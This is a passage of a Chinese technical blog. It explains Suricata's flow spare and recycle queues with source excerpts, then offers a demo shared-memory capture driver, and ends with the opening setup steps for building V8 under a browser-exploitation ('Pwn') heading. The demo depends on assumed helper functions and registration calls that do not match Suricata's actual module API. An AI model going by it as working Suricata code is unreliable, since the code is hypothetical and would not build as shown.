            Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowAlloc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>

            <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">,</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>流的回收，即从<code>flow_recycle_q</code>到<code>flow_spare_q</code></p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> TmEcode <span class="token function">FlowRecycler</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>th_v<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>thread_data<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">FLOWLOCK_WRLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">OutputFlowLog</span><span class="token punctuation">(</span>th_v<span class="token punctuation">,</span> ftd<span class="token operator">-></span>output_thread_data<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token function">FlowClearMemory</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>protomap<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">FlowMoveToSpare</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
                recycled_cnt<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h4 id="出队"><a href="#出队" class="headerlink" title="出队"></a>出队</h4><p><code>flow_spare_q</code>的出队的操作，主要发生在：</p>
<ol>
<li><p>流的分配</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> Flow <span class="token operator">*</span><span class="token function">FlowGetNew</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>tv<span class="token punctuation">,</span> DecodeThreadVars <span class="token operator">*</span>dtv<span class="token punctuation">,</span> <span class="token keyword">const</span> Packet <span class="token operator">*</span>p<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment">/* get a flow from the spare queue */</span>
    f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

  <pre class="line-numbers language-c" data-language="c"><code class="language-c">Flow <span class="token operator">*</span><span class="token function">FlowGetFromFlowKey</span><span class="token punctuation">(</span>FlowKey <span class="token operator">*</span>key<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">timespec</span> <span class="token operator">*</span>ttime<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token class-name">uint32_t</span> hash<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment">/* No existing flow so let's get one new */</span>
    f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>释放多余的分配的流</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">FlowUpdateSpareFlows</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>len <span class="token operator">></span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        tofree <span class="token operator">=</span> len <span class="token operator">-</span> flow_config<span class="token punctuation">.</span>prealloc<span class="token punctuation">;</span>

        <span class="token class-name">uint32_t</span> i<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> tofree<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token comment">/* FlowDequeue locks the queue */</span>
            Flow <span class="token operator">*</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>f <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
                <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>进程退出</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowShutdown</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token comment">/* free queues */</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_spare_q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">FlowFree</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="recycle队列"><a href="#recycle队列" class="headerlink" title="recycle队列"></a>recycle队列</h3><ol>
<li><p>recycle队列存储着将传递到清理、日志线程的流。</p>
  <pre class="line-numbers language-none"><code class="language-none">FlowQueue flow_recycle_q;
FlowQueueInit(&amp;flow_recycle_q);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li>
</ol>
<h4 id="入队-1"><a href="#入队-1" class="headerlink" title="入队"></a>入队</h4><p><code>flow_recycle_q</code>的入队的操作，主要发生在:</p>
<ol>
<li><p>流超时进行回收</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token class-name">uint32_t</span> <span class="token function">FlowManagerHashRowTimeout</span><span class="token punctuation">(</span>Flow <span class="token operator">*</span>f<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">timeval</span> <span class="token operator">*</span>ts<span class="token punctuation">,</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
            <span class="token comment">/* no one is referring to this flow, use_cnt 0, removed from hash
             * so we can unlock it and pass it to the flow recycler */</span>
            <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>进程退出时，对流hash桶中的流进行回收处理</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token class-name">uint32_t</span> <span class="token function">FlowManagerHashRowCleanup</span><span class="token punctuation">(</span>Flow <span class="token operator">*</span>f<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
        <span class="token comment">/* no one is referring to this flow, use_cnt 0, removed from hash
         * so we can unlock it and move it to the recycle queue. */</span>
        <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">FlowEnqueue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h4 id="出队-1"><a href="#出队-1" class="headerlink" title="出队"></a>出队</h4><p>​    <code>flow_recycle_q</code>的出队的操作，主要发生在：</p>
<ol>
<li><p>流的回收，即从<code>flow_recycle_q</code>到<code>flow_spare_q</code></p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> TmEcode <span class="token function">FlowRecycler</span><span class="token punctuation">(</span>ThreadVars <span class="token operator">*</span>th_v<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span>thread_data<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
       <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                <span class="token function">FLOWLOCK_WRLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token function">OutputFlowLog</span><span class="token punctuation">(</span>th_v<span class="token punctuation">,</span> ftd<span class="token operator">-></span>output_thread_data<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>

                <span class="token function">FlowClearMemory</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>protomap<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">FLOWLOCK_UNLOCK</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token function">FlowMoveToSpare</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
                recycled_cnt<span class="token operator">++</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>进程退出</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">FlowShutdown</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">=</span> <span class="token function">FlowDequeue</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>flow_recycle_q<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">FlowFree</span><span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

</li>
</ol>
<h2 id="实现-Suricata-从共享内存中读取流量数据的-demo"><a href="#实现-Suricata-从共享内存中读取流量数据的-demo" class="headerlink" title="实现 Suricata 从共享内存中读取流量数据的 demo"></a>实现 Suricata 从共享内存中读取流量数据的 demo</h2><h3 id="添加新抓包驱动"><a href="#添加新抓包驱动" class="headerlink" title="添加新抓包驱动"></a>添加新抓包驱动</h3><ol>
<li><p>  首先，需要在 Suricata 源代码中添加一个新的抓包驱动。找到 <code>source-af-packet.c</code> 或其他现有抓包驱动文件，作为新驱动实现的模板。</p>
</li>
<li><p>文件 <code>source-sharedmem.c</code></p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"suricata-common.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"source.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"decode.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"util-sharedmem.h"</span>  <span class="token comment">// 假设我们有一个处理共享内存的工具</span></span>

<span class="token comment">// 定义抓包驱动的初始化函数</span>
<span class="token keyword">int</span> <span class="token function">SharedMemInit</span><span class="token punctuation">(</span>ConfNode <span class="token operator">*</span>conf<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>device<span class="token punctuation">,</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token operator">*</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 初始化共享内存</span>
    <span class="token operator">*</span>data <span class="token operator">=</span> <span class="token function">SharedMemAttach</span><span class="token punctuation">(</span>device<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>data <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 定义抓包驱动的关闭函数</span>
<span class="token keyword">void</span> <span class="token function">SharedMemClose</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 关闭共享内存</span>
    <span class="token function">SharedMemDetach</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 定义抓包驱动的读取函数</span>
<span class="token keyword">int</span> <span class="token function">SharedMemRead</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>data<span class="token punctuation">,</span> Packet <span class="token operator">*</span>p<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 从共享内存中读取数据</span>
    <span class="token keyword">return</span> <span class="token function">SharedMemFetch</span><span class="token punctuation">(</span>data<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">// 定义抓包驱动的配置结构</span>
CaptureInterface shared_mem_iface <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">"sharedmem"</span><span class="token punctuation">,</span>
    <span class="token punctuation">.</span>Init <span class="token operator">=</span> SharedMemInit<span class="token punctuation">,</span>
    <span class="token punctuation">.</span>Close <span class="token operator">=</span> SharedMemClose<span class="token punctuation">,</span>
    <span class="token punctuation">.</span>Read <span class="token operator">=</span> SharedMemRead<span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token comment">// 在 Suricata 初始化时注册抓包驱动</span>
<span class="token keyword">void</span> <span class="token function">TmModuleSharedMemRegister</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token function">TmModuleRegisterCaptureInterface</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shared_mem_iface<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="然后，在-tm-threads-c-文件中注册新的抓包驱动："><a href="#然后，在-tm-threads-c-文件中注册新的抓包驱动：" class="headerlink" title="然后，在 tm-threads.c 文件中注册新的抓包驱动："></a>然后，在 <code>tm-threads.c</code> 文件中注册新的抓包驱动：</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">extern</span> <span class="token keyword">void</span> <span class="token function">TmModuleSharedMemRegister</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">TmThreadsRegisterAll</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// ... 其他抓包驱动注册</span>
    <span class="token function">TmModuleSharedMemRegister</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="添加新的运行模式"><a href="#添加新的运行模式" class="headerlink" title="添加新的运行模式"></a>添加新的运行模式</h3><ol>
<li><p>找到 Suricata 源代码中的 <code>runmodes.c</code> 文件，并添加新的运行模式，例如 <code>sharedmem</code></p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"runmode-sharedmem.h"</span></span>

<span class="token keyword">void</span> <span class="token function">RunModeRegisterAll</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// ... 其他运行模式注册</span>
    <span class="token function">RunModeRegister</span><span class="token punctuation">(</span><span class="token string">"sharedmem"</span><span class="token punctuation">,</span> RunModeSharedMemAutoFp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>在 <code>runmode-sharedmem.c</code> 文件中实现新的运行模式：</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"suricata-common.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"threads.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"source.h"</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"runmode.h"</span></span>

<span class="token keyword">void</span> <span class="token function">RunModeSharedMemAutoFp</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 配置线程和队列</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">InitAutoFp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 创建和启动线程</span>
    <span class="token function">TmThreadSpawn</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>shared_mem_iface<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// 处理线程队列</span>
    <span class="token function">TmThreadsSlotScheduler</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="修改-ThreadVars-数据结构"><a href="#修改-ThreadVars-数据结构" class="headerlink" title="修改 ThreadVars 数据结构"></a>修改 ThreadVars 数据结构</h3><ol>
<li><p>为新的运行模式创建对应的 <code>ThreadVars</code> 数据结构：</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">SharedMemThreadVars_</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 定义线程变量</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>shared_mem<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> SharedMemThreadVars<span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>在 <code>runmode-sharedmem.c</code> 文件中使用该数据结构：</p>
  <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"runmode-sharedmem.h"</span></span>

<span class="token keyword">int</span> <span class="token function">InitAutoFp</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 初始化线程变量</span>
    SharedMemThreadVars <span class="token operator">*</span>tv <span class="token operator">=</span> <span class="token function">SCMalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>SharedMemThreadVars<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tv <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token comment">// 初始化共享内存</span>
    tv<span class="token operator">-></span>shared_mem <span class="token operator">=</span> <span class="token function">SharedMemAttach</span><span class="token punctuation">(</span><span class="token string">"/path/to/shared_mem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tv<span class="token operator">-></span>shared_mem <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
</ol>
<h3 id="实现从共享内存读取流量数据的-demo"><a href="#实现从共享内存读取流量数据的-demo" class="headerlink" title="实现从共享内存读取流量数据的 demo"></a>实现从共享内存读取流量数据的 demo</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"util-sharedmem.h"</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token comment">// 附加到共享内存</span>
    <span class="token keyword">void</span> <span class="token operator">*</span>shared_mem <span class="token operator">=</span> <span class="token function">SharedMemAttach</span><span class="token punctuation">(</span><span class="token string">"/path/to/shared_mem"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>shared_mem <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Failed to attach shared memory\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 读取数据包</span>
    Packet p<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">SharedMemFetch</span><span class="token punctuation">(</span>shared_mem<span class="token punctuation">,</span> <span class="token operator">&amp;</span>p<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token comment">// 处理数据包</span>
        <span class="token function">ProcessPacket</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>p<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 分离共享内存</span>
    <span class="token function">SharedMemDetach</span><span class="token punctuation">(</span>shared_mem<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h1 id="Pwn-浏览器内核V8"><a href="#Pwn-浏览器内核V8" class="headerlink" title="Pwn-浏览器内核V8"></a>Pwn-浏览器内核V8</h1><h2 id="V8环境搭建"><a href="#V8环境搭建" class="headerlink" title="V8环境搭建"></a>V8环境搭建</h2><h3 id="编译V8"><a href="#编译V8" class="headerlink" title="编译V8"></a>编译V8</h3><ol>
<li><p>  Ubuntu 18.04操作系统</p>
</li>
<li><p>下载用于Chromium开发的工具depot_tools，用于V8的编译</p>
  <pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;chromium.googlesource.com&#x2F;chromium&#x2F;tools&#x2F;depot_tools.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>将 <code>depot_tools</code> 添加到环境变量 <code>PATH</code> 的末尾</p>
  <pre class="line-numbers language-none"><code class="language-none">export PATH&#x3D;$PATH:&lt;path to depot_tools&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>挂好代理，进入到 <code>depot_tools</code> 。直接安装会 <code>ninja</code> 报错需要先将版本回退到 <code>138bff28</code>** 并且将 <code>DEPOT_TOOLS_UPDATE</code> 设为 0 。之后更新 <code>depot_tools</code> 。</p>
  <pre class="line-numbers language-none"><code class="language-none">git reset --hard 138bff28
export DEPOT_TOOLS_UPDATE&#x3D;0
gclient<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li>
<li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240713210430.png"></p>
</li>
<li><p>下载 <code>v8</code>，这个时间比较长，下载完后目录下会多一个 <code>v8</code> 文件夹。</p>
  <pre class="line-numbers language-none"><code class="language-none">fetch v8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>首先安装浏览器然后再网址栏中输入 <code>chrome://version</code> 查看版本，例如：</p>
  <pre class="line-numbers language-none"><code class="language-none">112.0.5615.87 (正式版本) （64 位） (cohort: Bypass)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p>  打开 github 的 <a target="_blank" rel="noopener" href="https://github.com/chromium/chromium">chrome</a> 项目，搜索版本号并切换至相应版本。</p>
</li>
